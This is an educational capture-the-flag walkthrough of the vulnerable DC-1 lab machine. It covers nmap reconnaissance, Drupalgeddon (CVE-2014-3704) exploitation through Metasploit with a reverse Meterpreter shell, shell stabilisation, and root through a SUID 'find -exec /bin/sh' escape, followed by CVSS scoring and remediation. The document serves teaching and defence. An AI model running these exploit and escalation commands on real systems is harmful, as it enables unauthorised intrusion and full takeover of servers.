
# Detailed Notes — Lab 04: DC-1

This file is the **extended edition** of `README.md`. The original text (the four-phase methodology) is preserved **in full**, and each section is followed by an *"Explanation"* box that analyzes the theory, the commands, and the reasoning behind every step.

**The concept of a penetration test**

A penetration test is a **controlled** simulation of an attack whose purpose is to improve defenses. It differs from a real attack in three respects: there is **authorization**, there are **boundaries** (scope), and there is a **report**. DC-1 is a lab machine built specifically for this purpose.

**The four phases and what each one produces**

| Phase | Question | Deliverable |
| :--- | :--- | :--- |
| **1. Recon** | What is on the network and what is running? | List of hosts, ports, versions |
| **2. Exploitation** | Which vulnerability can be exploited? | Access (shell) |
| **3. Post-exploitation** | What can I see from the inside? | Data, flags, paths |
| **4. Privilege escalation** | How do I become root? | Full control |

**What you will learn:** why ARP discovery is more reliable than ping, how to read a full scan of all 65,535 ports, how Metasploit operates as a complete framework rather than a one-step automated solution, what Meterpreter is and why a "dumb" shell is not sufficient, and how a single incorrect permission (SUID on a utility such as `find`) yields root.

---

# Lab Manual: The DC-1 Machine

This manual is a penetration testing walkthrough of the vulnerable virtual machine **DC-1**. The main objective of this lab exercise is to guide the researcher or security assessor through a realistic vulnerability assessment lifecycle, adhering closely to international best practices.

The study of the DC-1 machine examines in depth several critical concepts of information systems security, including the identification of attack surfaces on the local network, the analysis and exploitation of known architectural flaws in Content Management Systems (CMS), shell stabilization and post-exploitation of Linux infrastructure, and the exploitation of access-permission misconfigurations in the Unix file system to achieve Local Privilege Escalation.

> **Source / Download:** [VulnHub — DC: 1](https://www.vulnhub.com/entry/dc-1,292/), **Reference writeup:** [Hacking Articles — DC-1: Vulnhub Walkthrough](https://www.hackingarticles.in/dc-1-vulnhub-walkthrough/)

The overall process is structured into the following four methodological phases:
1. **Reconnaissance & Network Mapping (Reconnaissance & Service Fingerprinting)**
2. **Vulnerability Analysis & Initial Compromise (Vulnerability Assessment & Weaponized Exploitation)**
3. **Post-Exploitation, Stabilization & Evidence Collection (Post-Exploitation & Data Harvesting)**
4. **Internal Permission Analysis & Privilege Escalation (Privilege Escalation to Root)**

---

## 2. Phase 1: Reconnaissance & Service Discovery (Reconnaissance & Discovery)


### Phase 1 Explanation — why reconnaissance is performed methodically

Reconnaissance is divided into **passive** (does not touch the target: OSINT, documents, DNS records) and **active** (sends packets). In the lab we perform active reconnaissance, because the target is local and under our own control.

**An order that does not fail:**

```
1. What is my IP?                ip a
2. Which hosts exist?            netdiscover / arp-scan
3. Which ports are listening?    nmap -p-
4. Which versions?               nmap -sV
5. What does the app expose?     browser + curl + fuzzing
```

A common beginner mistake is to start directly at step 4 or 5, mechanically reproducing a published writeup. Without steps 1–3 it is not even certain that you are communicating with the correct machine.

### 2.1 Test Environment Configuration & Network Architecture


#### Explanation 2.1 — why isolation is a technical requirement, not a formality

**Host-Only vs NAT Network** — what changes for the lab:

| | Host-Only | NAT Network |
| :--- | :--- | :--- |
| Kali ↔ DC-1 | ✅ | ✅ |
| Internet access | ❌ | ✅ (via host) |
| Risk of leakage into a real network | None | None (behind NAT) |
| Tool updates/downloads | Must be done beforehand | Work normally |

**Why "Black-Box":** the assessor does not know the IP address in advance. This is realistic: in a real engagement you often start with nothing more than a network range.

**Verify that the environment is correct before proceeding:**

```bash
ip a                          # do you have an IP in the same subnet as the target?
ping -c 2 <target-IP>         # if not, see §2.2 (ARP)
```

**Note for VMware/VirtualBox:** if both VMs are on a NAT Network, `netdiscover` sees only the VMs on that same network — not your physical LAN. This is the desired behavior.

To ensure the safe and reliable execution of the test, both the attacker's workstation (Kali Linux) and the vulnerable target machine (DC-1) are placed within a controlled, isolated virtual network (Host-Only mode or a shared NAT Network via the VirtualBox / VMware Workstation hypervisor). This architecture guarantees that the training attack will not leak into production corporate or home networks, while at the same time providing seamless bidirectional connectivity at OSI Layer 2 (Data Link) and Layer 3 (Network).

In a typical "Black-Box" penetration testing scenario, the assessor does not know in advance the static or dynamic IPv4 address of the target, since it is assigned automatically by the built-in DHCP service of the virtual environment. Consequently, the first necessary action is to locate the target machine using passive or active scanning techniques at the local network level.

### 2.2 Discovering Live Hosts via the ARP Protocol


#### Explanation 2.2 — ARP as a "mandatory" mechanism

**ARP** (Address Resolution Protocol) answers the question: *"which MAC address corresponds to this IP?"*. It is essential for all communication over Ethernet — without it, not a single packet leaves the host. For this reason it **cannot be "disabled"** the way ICMP can: a firewall that blocks ARP would isolate the machine from its own network.

**What you see in the image `image.png`:**

```
16 Captured ARP Req/Rep packets, from 4 hosts
192.168.35.1    00:50:56:c0:00:08   VMware, Inc.   ← NAT gateway
192.168.35.2    00:50:56:ed:1b:b2   VMware, Inc.   ← NAT DHCP/DNS
192.168.35.131  00:0c:29:65:4d:49   VMware, Inc.   ← THE TARGET (DC-1)
192.168.35.254  00:50:56:e9:05:dc   VMware, Inc.   ← gateway/other VM
```

**How to identify the target:** `.1`, `.2` and `.254` are typical infrastructure addresses (gateway, DNS). The target is usually a "random" address in the middle of the range — here, `.131`.

**Why "Count 13" appears for the gateway:** `netdiscover` has already exchanged packets with it (it is the router). The others have Count 1 — a single reply.

**Alternatives:** `arp-scan --localnet`, `nmap -sn 192.168.35.0/24`, or passive listening (`netdiscover -p`), which sends nothing and relies on broadcast traffic.

The detection of live hosts on the local subnet relies primarily on sending ARP (*Address Resolution Protocol*) requests. Unlike traditional ICMP Echo Request scans (commonly known as "ping"), which are frequently filtered or silently dropped by local firewalls (iptables, nftables, etc.), ARP packets are mandatory for communication at the Ethernet level. Every live node in the same broadcast domain is required by the design of the protocol to respond with its MAC address, which makes its detection infallible.

```bash
sudo netdiscover -r 192.168.35.0/24
```
* `sudo`: Runs the tool with elevated superuser (`root`) privileges, which are strictly required because direct access to the network interface (raw socket access) is needed to craft and send raw ARP packets.
* `netdiscover`: A specialized address discovery tool for local Ethernet networks, capable of operating both in passive listening mode and in an active mode that sends ARP queries in bulk.
* `-r 192.168.35.0/24`: Specifies the IPv4 subnet range under examination in CIDR (*Classless Inter-Domain Routing*) notation. The program sends ARP requests, sequentially or in parallel, for all 254 possible addresses in the range (`192.168.35.1` to `192.168.35.254`), collecting and sorting the replies in real time.

![Discovering Live Hosts on the Local Subnet with Netdiscover](../../04.%20DC-CTF/images/image.png)

*Figure 1 — Discovering Live Hosts on the Local Subnet with Netdiscover*

### 2.3 Full Port Scan and Service Identification (Deep Service Fingerprinting)


#### Explanation 2.3 — why `-p-` and what a "service fingerprint" means

**Why all ports:** by default, nmap checks the 1,000 most common ports. Management services (e.g., Tomcat on 8080, alternative SSH on 2222, databases on 3306/5432) often "hide" outside this set. `-p-` = `-p 1-65535`.

**Reading the output in the image `image-1.png`:**

```
22/tcp    open  ssh       OpenSSH 6.0p1 Debian 4+deb7u7
80/tcp    open  http      Apache httpd 2.2.22 ((Debian))
111/tcp   open  rpcbind   2-4 (RPC #100000)
51976/tcp open  status    1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Item | What it tells us |
| :--- | :--- |
| `OpenSSH 6.0p1 Debian 4+deb7u7` | **Debian 7 (Wheezy)** — released 2013, end-of-life: an old system |
| `Apache httpd 2.2.22` | Old Apache version → likely known vulnerabilities |
| `CPE: cpe:/o:linux:linux_kernel` | Identifier for CVE databases |

**The reasoning you should follow:** "Debian Wheezy + Apache 2.2" = a system that has not been updated in years. The next step, therefore, is to see **which application** runs on it — and that is where Drupal appears.

**Execution time:** `-p-` combined with `-sV` may take several minutes. In a real engagement, a fast scan is performed first (`-p- --min-rate 1000`), followed by a targeted `-sV` against the open ports.

**Caution:** a full scan is particularly "noisy" — it is easily logged by intrusion detection systems (IDS). In a lab environment this does not matter; on a production system, however, it is a significant factor.

Once the target's IP address (`192.168.35.131`) has been confirmed, a detailed mapping of the open TCP ports and the extraction of the characteristic banners of the running services are required. A superficial scan of only the 1,000 most common ports (the default Nmap scan) carries the risk of overlooking critical services running on unusual or high-numbered ports. For this reason, an exhaustive scan of the entire range of 65,535 ports is chosen.

```bash
nmap -sV -p- 192.168.35.131
```

![Detailed Nmap Service Scan Output](../../04.%20DC-CTF/images/image-1.png)
*Figure 2 — Detailed Nmap Service Scan Output*

* `nmap`: Network Mapper, the internationally recognized tool for network auditing, topology mapping, and vulnerability analysis.
* `-sV` (*Service Version Detection*): Enables the version detection mechanism. Nmap performs a TCP handshake on the open ports, sends specialized sequences of data (probes) from the `nmap-service-probes` database, and analyzes the responses to identify precisely the name and version of each application.
* `-p-`: Shorthand for `-p 1-65535`. Forces a check of every one of the 65,535 available TCP ports, eliminating the possibility of services being concealed on non-standard ports.
* `192.168.35.131`: The IPv4 address of the target system obtained in the previous step.

### 2.4 Web Application Inspection & Preliminary Vulnerability Assessment


#### Explanation 2.4 — how a CMS is identified and why the version matters

**Drupal identification points** (these also apply to WordPress/Joomla):

| Point | What it reveals |
| :--- | :--- |
| `/CHANGELOG.txt` | Exact version (if it has not been removed) |
| `<meta name="Generator" content="Drupal 7">` | CMS and major version |
| `/sites/default/settings.php` | Configuration file (if accessible) |
| URL structure `/node/1`, `/user/login` | Characteristic of Drupal |
| Cookies `SESS…`, `Drupal.toolbar` | Indicators of Drupal |

**Why version 7.x is critical:** Drupal 7 had severe SQL injection vulnerabilities in the login/registration form. The best known is **CVE-2014-3704** ("Drupalgeddon"), with a CVSS score of **9.8**. It affects versions 7.0–7.31.

**What CVSS is:** a severity scoring standard from 0 to 10, based on:

* **Attack Vector** (network or local?)
* **Complexity** (how easy is it?)
* **Privileges required** (is an account needed?)
* **Impact** (confidentiality, integrity, availability).

A score of `9.8` means: remote, unauthenticated, with no particular complexity, and with full impact — in other words, "anyone on the network can achieve code execution."

**What the administrator should have done:** update to a supported version, remove `CHANGELOG.txt`, deploy a WAF with SQLi rules, and restrict access to the administration interface.

Analysis of port 80 indicates the presence of an Apache server on a Debian Wheezy (7.x) operating system, which points to a significantly outdated system. Navigating with a web browser to `http://192.168.35.131/` displays the home page of the popular Content Management System **Drupal**.

Inspection of the page's source code, its meta tags, and files such as `/CHANGELOG.txt` reveals that this is **Drupal 7.x**. Historically, the Drupal 7.x branch exhibited fundamental architectural security gaps in input parameter handling and database query execution, the most notorious example being the Drupalgeddon vulnerability (CVE-2014-3704), which allows unauthorized remote users to execute arbitrary code (Remote Code Execution - RCE).

---

## 3. Phase 2: Vulnerability Analysis & Initial Compromise (Exploitation)


### Phase 2 Explanation — the transition from "I know" to "I can"

Exploitation is the most "dangerous" stage: a single wrong action can destroy data or bring the service down. For this reason, in a real engagement:

1. The vulnerability is **confirmed** in a non-destructive way (e.g., by checking the version).
2. The least intrusive exploit is **selected**.
3. Exactly what was executed is **recorded** (for the report).
4. It is **verified** whether the action affected others (e.g., shared hosting).

### 3.1 Launching and Preparing the Metasploit Framework


#### Explanation 3.1 — what Metasploit is and what it is NOT

The **Metasploit Framework (MSF)** is a platform that organizes:

| Concept | Role |
| :--- | :--- |
| **Module** | The code (exploit, auxiliary, post) |
| **Payload** | What runs on the target after success (e.g., a reverse shell) |
| **Handler** | The listener that waits for the connection back |
| **Session** | The active connection to the target |
| **Database** | Storage of hosts, services, credentials, loot |

**Startup (`msfconsole`)** loads thousands of modules and connects to PostgreSQL. It works without a database, but it does not "remember" results (`db_nmap`, `hosts`, `services`).

**Useful commands before the exploit:**

```
msf6 > db_status              # is there a database?
msf6 > search drupal          # find modules
msf6 > info <module>          # description, options, references
msf6 > show options           # what I need to fill in
msf6 > show payloads          # compatible payloads
```

**Why simply running it is not enough:** without correctly setting `RHOSTS`, `LHOST` (*our own* IP address) and `LPORT`, the payload will attempt to connect to the wrong address. `LHOST` must correspond to the IP address of the interface that communicates with the target — a common mistake on VMs with multiple interfaces.

**In the image `image-2.png`:** the version (`metasploit v6.4.103-dev`) and the number of modules — 2,584 exploits — are shown. The number does not mean "more power"; it means "more material to learn from."

To systematize and carry out the attack, the **Metasploit Framework** is used, the most widely adopted penetration testing platform. Metasploit provides a comprehensive infrastructure for managing exploits, payloads, encoders, and auxiliary tools, enabling automated verification of security flaws in a stable and predictable manner.

```bash
msfconsole
```

* `msfconsole`: Launches Metasploit's interactive Command-Line Interface. At startup, the environment initializes connections to the underlying PostgreSQL database, loads thousands of catalogued vulnerability modules into RAM, and provides a flexible shell for managing attacks.

![Launching the msfconsole Interface](../../04.%20DC-CTF/images/image-2.png)
*Figure 3 — Launching the msfconsole Interface*

### 3.2 Searching for Dedicated Modules for the Drupal CMS


#### Explanation 3.2 — reading the results table

The image `image-3.png` shows the output of `search drupal`. The columns that matter are:

| Column | Meaning |
| :--- | :--- |
| **Disclosure Date** | When the vulnerability was published |
| **Rank** | Module reliability (`excellent` > `great` > `good` > `normal`) |
| **Check** | Whether the module can **confirm** the vulnerability without exploiting it |
| **Description** | What exactly it exploits |

**The three Drupal modules that stand out:**

* `exploit/multi/http/drupal_drupageddon` (2014) — **the vulnerability in this lab** (CVE-2014-3704), SQLi in the form.
* `exploit/unix/webapp/drupal_drupalgeddon2` (2018) — CVE-2018-7600, affects 7.x **and** 8.x; a different vulnerability.
* `exploit/unix/webapp/drupal_coder_exec` — via the Coder module.

**Why we read `info` before `use`:** `info` shows the **exact versions** affected. If the target is 7.32, drupageddon (7.0–7.31) **will not work** — and testing it blindly is not advisable.

**Useful filter:**

```
msf6 > search type:exploit platform:php drupal
msf6 > search cve:2014-3704
```

With the Metasploit environment ready for use, a query is issued against the built-in indexed database in order to locate all available exploitation modules targeting the Drupal platform.

```bash
msf6 > search drupal
```

* `search drupal`: Recursively searches the `exploits/`, `auxiliary/` and `post/` libraries for any module containing the term "drupal" in its title, description, or metadata. The result is a table with the module name, the vulnerability disclosure date, the reliability indicator (Ranking), and a short description of the attack mechanism.

![Drupal Module Search Results Table](../../04.%20DC-CTF/images/image-3.png)

*Figure 4 — Drupal Module Search Results Table*

### 3.3 Module Selection, Configuration & Attack Execution


#### Explanation 3.3 — how Drupalgeddon works technically

**The root cause:** Drupal 7 uses a *Database Abstraction Layer* (DBAL). In certain functions, the **table name** was passed into the SQL query without validation. Prepared statements protect **values**, not **object names** — and that is where the gap lay.

**The result:** an unauthenticated user can send a specially crafted request to the form and execute arbitrary SQL. From there, by means of an `INSERT` into a Drupal table, the attacker can plant PHP code that is executed by Apache.

**The Metasploit sequence:**

```
use exploit/multi/http/drupal_drupageddon
set RHOSTS 192.168.35.131     ← the target
set LHOST 192.168.35.129      ← us (Kali)
set LPORT 4444                ← listening port
exploit
```

**What happens behind the scenes (image `image-7.png`):**

1. `Started reverse TCP handler on 192.168.35.129:4444` — a listener is opened.
2. `Sending stage (41224 bytes)` — the payload is sent.
3. `Meterpreter session 1 opened (… → 192.168.35.131:34255)` — the target connects **back** to us.

**Why a reverse shell rather than a bind shell:** a reverse shell originates from the target toward us, so it passes through firewalls that permit outbound traffic (the usual configuration).

**If it fails:** check `LHOST` (correct interface?), the firewall on Kali, whether Apache can execute PHP (`php -v` on the target), and whether the version is actually vulnerable (`/CHANGELOG.txt`).

From the results, the module `exploit/multi/http/drupal_drupageddon` is selected. This vulnerability (**CVE-2014-3704**) resides in the Database Abstraction API of Drupal 7.x, which did not adequately sanitize the table parameters passed into prepared SQL statements.

![`use exploit/multi/http/drupal_drupageddon`: automatic selection of the `php/meterpreter/reverse_tcp` payload.](../../04.%20DC-CTF/images/image-4.png)

*Figure 5 — `use exploit/multi/http/drupal_drupageddon`: automatic selection of the `php/meterpreter/reverse_tcp` payload.*

This allows an unauthenticated remote attacker to perform SQL Injection, through which they can modify administrative tables, insert malicious PHP commands into the database, or achieve direct arbitrary code execution on the operating system (Remote Code Execution - RCE).

```bash
msf6 > use exploit/multi/http/drupal_drupageddon
msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.35.131
msf6 exploit(multi/http/drupal_drupageddon) > exploit
```

* `use exploit/multi/http/drupal_drupageddon`: Loads the specified exploit module into the active working environment, automatically configuring the default compatible payload, usually `php/meterpreter/reverse_tcp`.
 * `set RHOSTS 192.168.35.131`: Sets the `RHOSTS` (*Remote Hosts*) variable, specifying the IPv4 address of the vulnerable target server.
 * `exploit` (or alternatively `run`): Launches the attack. Metasploit sets up a local listener (handler) on the Kali machine, crafts the malicious HTTP POST requests containing the SQL Injection payload and the reverse PHP shell, and sends them to the target. As soon as the code is executed by the Apache server, the target connects back to Kali Linux, opening an active Meterpreter session.

![Setting the target with `set RHOSTS 192.168.35.131`.](../../04.%20DC-CTF/images/image-5.png)

*Figure 6 — Setting the target with `set RHOSTS 192.168.35.131`.*

![Successful Exploitation and Opening of a Meterpreter Session](../../04.%20DC-CTF/images/image-7.png)

*Figure 7 — Successful Exploitation and Opening of a Meterpreter Session*

---

## 4. Phase 3: Post-Exploitation & Evidence Collection (Post-Exploitation)


### Phase 3 Explanation — from "I have a connection" to "I have information"

Once access has been obtained, the task is **enumeration from the inside**:

| What we look for | Command/Location |
| :--- | :--- |
| User identity | `id`, `whoami` |
| sudo privileges | `sudo -l` |
| Config files with credentials | `find / -name "settings.php" -o -name "wp-config.php"` |
| Other users | `cat /etc/passwd` |
| Cron jobs (privesc) | `cat /etc/crontab`, `ls /etc/cron.*` |
| SUID binaries | `find / -perm -u=s -type f 2>/dev/null` |
| Network access | `ss -tuln`, `ip a` |

**Rule:** running automated vulnerability-discovery tools before understanding the system is not recommended. Manual enumeration provides genuine understanding — and it often reveals details that automated tools overlook.

### 4.1 Dropping into a System Shell and Upgrading to a PTY


#### Explanation 4.1 — why a "dumb" shell is not sufficient

Meterpreter is a powerful but "closed" environment: it does not provide the system's own commands. The `shell` command opens `/bin/sh` **through** the session (image `image-8.png`: `Process 3359 created. Channel 0 created.`).

**What a dumb shell lacks:**

| Problem | Consequence |
| :--- | :--- |
| No TTY | `sudo`, `su`, `less`, `vim` do not work |
| No job control | `Ctrl+C` kills the session, not the process |
| No autocomplete/history | Work becomes cumbersome |
| No prompt | You do not know where you are |

**The solution — `python -c 'import pty; pty.spawn("/bin/bash")'`:**

* Python opens a **pseudo-terminal** (PTY) and attaches bash to it.
* bash believes it is running in a normal terminal → prompts, colors, and job control return.

**Full stabilization (the correct order):**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl+Z (background), in the local shell:
stty raw -echo; fg
# Enter, then:
export TERM=xterm
stty rows 40 columns 120
```

**Why `export TERM=xterm`:** without it, programs such as `nano` or `top` display "TERM environment variable not set" or garbled output.

**If Python is not available:** `script -qc /bin/bash /dev/null`, or Perl: `perl -e 'exec "/bin/bash";'`.

The Meterpreter session provides powerful capabilities for memory management, file transfer, and process execution; however, thorough exploration of a Linux operating system requires direct access to the native Unix command shell.

```bash
meterpreter > shell
```



* `shell`: Creates a new communication sub-channel within the Meterpreter session and starts a process of the basic command shell (`/bin/sh`) on the target.


![Launching a Basic Shell via Meterpreter](../../04.%20DC-CTF/images/image-8.png)
*Figure 8 — Launching a Basic Shell via Meterpreter*

The initial shell obtained is "dumb." It lacks TTY support, tab completion, command history via the arrow keys, and proper handling of termination signals (e.g., pressing `Ctrl+C` will terminate the entire session rather than the current process). To overcome this limitation, the shell is upgraded to a full Pseudo-Terminal (PTY) using the Python interpreter.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

* `python`: Invokes the Python interpreter installed on the target system.
* `-c`: Allows Python code passed as a string argument on the command line to be executed directly, avoiding the need to write a temporary script file to disk.
* `'import pty; pty.spawn("/bin/bash")'`: Imports Python's built-in `pty` library (which handles pseudo-terminal operations on Unix operating systems) and calls the `spawn()` method. This method starts a new `/bin/bash` process attached to a newly created virtual PTY, providing a fully functional, interactive shell with a recognizable user prompt.
                    |

### 4.2 Locating and Interpreting Flag 1


#### Explanation 4.2 — what the first flag tells us

The image `image-10.png` shows:

```
www-data@DC-1:/var/www$ cat flag1.txt
Every good CMS needs a config file - and so do you.
```

**Two things happen here:**

1. **Identity confirmation:** the `www-data` prompt shows that access is as the **web user**, not root. Phase 4 is therefore mandatory.
2. **Direction:** the flag *is not an end in itself* — it is a **hint**. "config file" means: look for `sites/default/settings.php` or `wp-config.php`.

**Why the CTF designer does this:** flags act as **checkpoints** that reward sound methodology. In a real audit there are no flags — there are findings (e.g., "credentials in a file with incorrect permissions").

**What we will look for in Drupal:**

```bash
cd /var/www
ls -la
cat sites/default/settings.php | grep -A5 "databases"
```

`settings.php` contains `$databases['default']['default']` with `database`, `username`, `password`, `host` — that is, MySQL credentials.

**Security note:** `settings.php` should be `444` or located outside the web root. If it is readable by `www-data`, any web application vulnerability leads to database access.

Now positioned in the web server's working directory (`/var/www`), a detailed listing of the files is performed in order to locate the initial guidance left by the creator of the lab.

```bash
ls -la
cat flag1.txt
```

 * `ls -la`:
* `ls`: Displays the contents of the current directory.
* `-l` (*long listing*): Shows detailed information for each file (rwx access permissions, number of links, owner, group, size in bytes, and last-modification timestamp).
* `-a` (*all*): Shows all files, including hidden ones (those whose name begins with a dot `.`, such as `.htaccess`, `.bashrc`).
 * `cat flag1.txt`: Concatenates and prints the contents of the text file `flag1.txt` to standard output (stdout).

![Reading the flag1.txt File](../../04.%20DC-CTF/images/image-10.png)
*Figure 9 — Reading the flag1.txt File*

The content of Flag 1 indicates that the CMS configuration files contain critical data. In Drupal 7, the fundamental configuration file is `sites/default/settings.php`, which includes, among other things, the credentials for connecting to the MySQL database.

---

## 5. Phase 4: Local Privilege Escalation


### Phase 4 Explanation — the logic of escalation

Privilege escalation answers a single question: *"what am I allowed to do that I should not be?"*. The categories that are always checked, in order of priority:

| # | Check | Command | Why it works |
| :--- | :--- | :--- | :--- |
| 1 | sudo privileges | `sudo -l` | A wrong rule = immediate root |
| 2 | SUID binaries | `find / -perm -u=s` | Execution with the owner's privileges |
| 3 | Cron jobs | `cat /etc/crontab` | A script that runs as root and is writable |
| 4 | Capabilities | `getcap -r / 2>/dev/null` | A more "modern" form of SUID |
| 5 | Kernel exploits | `uname -a` + searchsploit | Old kernel |
| 6 | Credentials in files | `grep -r password` | Reuse |
| 7 | PATH hijacking | `echo $PATH` | A script that calls a command without an absolute path |

**On DC-1** the answer lies in #2: a general-purpose utility (`find`) with the SUID bit set.

### 5.1 Attack Surface Analysis & Detection of SUID Executables


#### Explanation 5.1 — what the "SUID bit" really means

**SUID (Set User ID):** when an executable has this bit set, it runs with the privileges of the file's **owner**, not those of the user who invokes it. If it is owned by root, it runs as root.

**Why it exists:** for tools that require privileges in order to work, e.g., `passwd` (must write to `/etc/shadow`), `ping` (raw sockets), `su`, `mount`.

**Why it becomes a vulnerability:** if the program allows **execution of another command** or an **escape to a shell**, then SUID hands root over to us.

**Breakdown of `find / -perm -u=s -type f 2>/dev/null`:**

| Part | Meaning |
| :--- | :--- |
| `find /` | Search from the root |
| `-perm -u=s` | Permissions that **include** SUID for the owner (`-4000`) |
| `-type f` | Regular files only |
| `2>/dev/null` | Discards the "Permission denied" messages |

**In the image `image-11.png`** you can see the usual entries (`/bin/ping`, `/bin/su`, `/usr/bin/passwd`) — and the suspicious one: **`/usr/bin/find`**. `find` does **not** need SUID in order to work; its presence is a configuration error.

**What you should do:** check every SUID file with `ls -l` and `dpkg -S <path>` to see whether it belongs to a package. Unexpected entries are suspicious.

The current session runs under the privileges of the `www-data` account (the standard unprivileged user used by the Apache service). Full compromise of the target requires obtaining the privileges of the superuser `root` (UID 0).

One of the most critical local privilege escalation mechanisms in Unix/Linux environments is the exploitation of executables that have the special **SUID** (*Set User ID*) permission enabled. When a binary has the SUID bit set, it always runs with the privileges of the file's owner rather than those of the user who invoked it. If a root-owned executable carries the SUID bit and at the same time allows the execution of external commands or a shell escape, it can be leveraged for immediate privilege escalation.

```bash
find / -perm -u=s -type f 2>/dev/null
```

* `find /`: Starts an exhaustive, recursive search beginning at the root of the file system (`/`).
* `-perm -u=s`: Filters the results, examining only files whose permissions include the SUID bit for their owning user (equivalent to the octal pattern `-4000`).
* `-type f`: Restricts the search exclusively to regular files, excluding directories, symbolic links, and special system devices.
* `2>/dev/null`: Redirects the standard error stream (Standard Error - file descriptor 2) to the kernel's special discard device `/dev/null`. This prevents hundreds of "Permission denied" messages from being produced as the unprivileged user `www-data` attempts to read protected system directories, keeping the output clean and readable.

![SUID Binary Scan Results](../../04.%20DC-CTF/images/image-11.png)

*Figure 10 — SUID Binary Scan Results*


### 5.2 Mechanism for Exploiting the SUID Permission on `find`


#### Explanation 5.2 — how the `-exec` option leads to root privileges

`find` has an `-exec` option that executes **any** command for each matching file. Because the binary is SUID root, every child process it creates inherits **EUID 0**.

**The command:**

```bash
/usr/bin/find . -exec /bin/sh \; -quit
```

| Part | Analysis |
| :--- | :--- |
| `/usr/bin/find` | Absolute path — avoids PATH hijacking |
| `.` | Search in the current directory |
| `-exec /bin/sh \;` | Run a shell for each result; `\;` terminates the option |
| `-quit` | Stop after the first one |

**Why `\;` and not `;`:** `;` would be interpreted by **our own** shell as the end of the command. The `\` "escapes" it so that it reaches `find`.

**Alternative exploitation methods (for reinforcement):**

```bash
find / -exec whoami \; -quit          # confirmation: root
find / -exec /bin/bash -p \; -quit    # bash with privileges
```

**The `-p` flag in bash:** preserves the privileges instead of dropping them (bash lowers the EUID when run as SUID, for security reasons).

**The image `image-12.png`** shows the shell that opens; `image-13.png` confirms it with `whoami` → `root`.

**How it is fixed:** `chmod u-s /usr/bin/find`, and review every SUID file against the criterion "is it really needed?".

The presence of the SUID bit on the executable `/usr/bin/find` constitutes a very serious Security Misconfiguration. The `find` utility incorporates the `-exec` feature, which allows the user to specify an arbitrary system command to be executed automatically for each object that satisfies the search criteria.

Because the `find` binary is owned by the `root` user and carries the SUID bit, every subprocess spawned through the `-exec` option automatically inherits the Effective User ID (EUID) of `root`. By directly invoking a system shell (such as `/bin/sh`), a shell with full superuser privileges is created.

```bash
/usr/bin/find . -exec /bin/sh \; -quit
```

![Shell with `root` privileges through abuse of the SUID `find`.](../../04.%20DC-CTF/images/image-12.png)

*Figure 11 — Shell with `root` privileges through abuse of the SUID `find`.*

* `/usr/bin/find`: Invokes the specific executable by its absolute path, preventing possible interference from environment variables such as `$PATH`.
* `.`: Sets the current directory as the search scope.
* `-exec /bin/sh \;`: Specifies the command to be executed.
  * `/bin/sh` starts a new shell session.
  * The `;` symbol marks the end of the `-exec` option, while the backslash `\` (escape character) is necessary so that the `;` character is interpreted by `find` itself and not prematurely by the parent bash shell.
 * `-quit`: Instructs `find` to terminate immediately after the first successful execution. Without the `-quit` option, `find` would attempt to execute `/bin/sh` successively for every file in the directory, creating multiple unnecessary subshells.

![Successful Privilege Escalation to Root](../../04.%20DC-CTF/images/image-13.png)

*Figure 12 — Successful Privilege Escalation to Root*

### 5.3 Identity Verification & Retrieval of the Final Flag


#### Explanation 5.3 — why we verify and what we look at in `/root`

**`whoami`** and **`id`**: `whoami` returns a name; `id` returns `uid=0(root) gid=0(root) groups=0(root)` — which is more precise. In environments involving an EUID, `id` also shows the effective ID.

**Why `/root` is the proof:** it is a directory with `700` permissions owned by root. If you can run `ls` inside it, you genuinely have root — this is not a "friendly" shell with an illusion of privilege.

**Reading the image `image-14.png`:**

```
# cat thefinalflag.txt
Well done!!!!
Hopefully you've enjoyed this and learned some new skills.
```

**What "completion" means:** it is not only the file; it is the fact that the entire chain was executed: recon → vulnerability → shell → enumeration → privesc. In a real engagement, this is where the **report** would be written, containing:

* the chain of exploitation
* the impact (what data was exposed)
* the reproduction steps
* the recommended remediations.

Having now obtained superuser (`root`) privileges, administrative authority over the system is confirmed and the final reward file (flag) is retrieved, marking the full completion of the penetration test.

```bash
whoami
cd /root
ls -la
cat thefinalflag.txt
```

* `whoami`: Returns the effective user name of the current session. The response `root` confirms operation at the highest privilege level of the operating system.
* `cd /root`: Changes the current working directory to the protected home directory of the system administrator, to which access by ordinary users is strictly prohibited.
* `ls -la`: Lists in detail all contents of the `/root` directory, revealing the presence of the file `thefinalflag.txt`.
* `cat thefinalflag.txt`: Reads and prints to the screen the final completion message of the lab.

![Reading the Final File thefinalflag.txt](../../04.%20DC-CTF/images/image-14.png)
*Figure 13 — Reading the Final File thefinalflag.txt*

## 6. Technical Summary, Risk Assessment & Remediation Measures


### §6 Explanation — how to read the risk table

The original table classifies two findings:

| Stage | Weakness | CVSS | Impact |
| :--- | :--- | :--- | :--- |
| Initial access | Drupalgeddon (CVE-2014-3704) | **9.8 Critical** | RCE via SQLi |
| Escalation | SUID on `/usr/bin/find` | **7.8 High** | Root |

**Why 9.8 is "Critical":** `AV:N` (network), `AC:L` (low complexity), `PR:N` (no privileges), `UI:N` (no user interaction), `C/I/A:H` (full impact). In other words: *anyone with network access achieves code execution, without the user doing anything*.

**Why SUID is 7.8 and not 9.8:** it requires **local** access (`AV:L`) — you must already be inside. This is why escalation is the "second step," not the point of entry.

**The concept of "defense in depth":** had Drupal been up to date, the chain would never have started. Had the SUID bit been absent, the chain would have stopped at `www-data`. Each control is an independent barrier.

The successful compromise of the DC-1 machine demonstrated a chain of two principal security flaws which, in combination, led from a complete absence of credentials (Zero Access) to absolute control of the infrastructure (Root Compromise).

| Attack Stage | Identified Weakness | Risk Level (CVSS v3) | Technical Impact |
| :--- | :--- | :--- | :--- |
| **Initial Compromise** | Drupalgeddon (CVE-2014-3704) | **CRITICAL (9.8)** | Remote arbitrary code execution (RCE) via SQLi |
| **Privilege Escalation** | SUID Misconfiguration on `/usr/bin/find` | **HIGH (7.8)** | Bypass of restriction mechanisms and acquisition of Root privileges |

### 6.1 Recommended Remediation Measures (Remediation & Hardening)


#### Explanation 6.1 — from fixing to "hardening"

**Patch management:** updating is the only defense that closes *all* known vulnerabilities at once. It requires a **process**: knowledge of versions, testing in staging, a rollback plan. End-of-life software (Debian Wheezy, Drupal 7) is not patched — it is replaced.

